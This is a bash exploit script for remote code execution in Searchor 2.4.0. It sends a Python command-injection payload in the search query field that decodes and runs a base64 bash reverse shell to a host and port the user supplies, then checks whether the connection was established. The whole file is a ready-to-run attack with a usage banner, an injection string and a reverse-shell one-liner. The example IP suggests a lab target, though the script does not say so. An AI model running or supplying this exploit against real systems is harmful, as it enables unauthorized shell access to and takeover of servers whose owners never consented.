#!/bin/bash

RED="\e[31m"
CYAN="\e[36m"
GREEN="\e[32m"
GRAY="\e[90m"

BOLD_RED="\e[1;31m"
BOLD_GREEN="\e[1;32m"
BOLD_CYAN="\e[1;36m"

ITALIC_GREEN="\e[3;32m"
ITALIC_GRAY="\e[3;90m"

ENDCOLOR="\e[0m"

# Exploit Title: Searchor 2.4.0 - Remote Code Execution

help_panel() {
    echo -e "\n${BOLD_RED}[!] Usage: searchor-rce.sh -u <target-url> -h <host> -p <port>${ENDCOLOR}"
    echo -e "\n${CYAN}Example: searchor-rce.sh -u http://example.com -h 10.10.14.176 -p 2566${ENDCOLOR}\n"
}

# Take user arguments
while getopts ":u:h:p:" opt; do
    case $opt in
        u) URL="$OPTARG"
        ;;
        h) HOST="$OPTARG"
        ;;
        p) PORT="$OPTARG"
        ;;
        # If no arguments are given, print usage
        \?) help_panel
        ;;
    esac
done

# Exploit function
do_exploit() {

    # Create the reverse shell payload
    echo -e "${ITALIC_GREEN}[+] Creating reverse shell payload...${ENDCOLOR}\n"
    sleep 1
    echo -e "${BOLD_CYAN}[*] Payload:${ENDCOLOR}\n"
    echo -e "${ITALIC_GRAY}bash -c 'bash -i >& /dev/tcp/$HOST/$PORT 0>&1' | base64 -w0${ENDCOLOR}\n"
    sleep 2

    base64_payload=$(echo "bash -c 'bash -i >& /dev/tcp/$HOST/$PORT 0>&1'" | base64 -w0)
    base64_urlencoded=$(echo $base64_payload | sed -r 's/[+]+/%2B/g')

    evil_cmd="',__import__('os').system('echo $base64_urlencoded|base64 -d|bash'))#"

    # Exploit the vulnerability
    echo -e "${ITALIC_GREEN}[+] Exploiting the vulnerability (Set your nc listener)...${ENDCOLOR}"
    sleep 2

    curl -s -X POST "$URL/search" -H "Content-Type: application/x-www-form-urlencoded" -d "engine=Bing&query=$evil_cmd" >/dev/null 2>&1 &

    # Check if the reverse shell is established
    echo -e "\n${ITALIC_GREEN}[+] Checking if the reverse shell is established...${ENDCOLOR}\n"
    sleep 2
    listener_established=$(lsof -i:$PORT | awk '{print $NF}' | awk 'END{print}')
    
    # Check if the text is equal to "ESTABLISHED"
    if [[ $listener_established == *"ESTABLISHED"* ]]; then
        echo -e "${BOLD_GREEN}[+] Reverse shell is established!${ENDCOLOR}\n"
    else
        echo -e "${BOLD_RED}[!] Something went wrong, don't forget to set the netcat listener${ENDCOLOR}\n"
    fi
}

# Check if the three arguments are given
if [ -z "$URL" ] || [ -z "$HOST" ] || [ -z "$PORT" ]; then
    help_panel
    exit 1
else
    echo -e "\n${BOLD_CYAN}[*] Exploiting Searchor RCE (2.4.0)...${ENDCOLOR}\n"
    do_exploit
fi









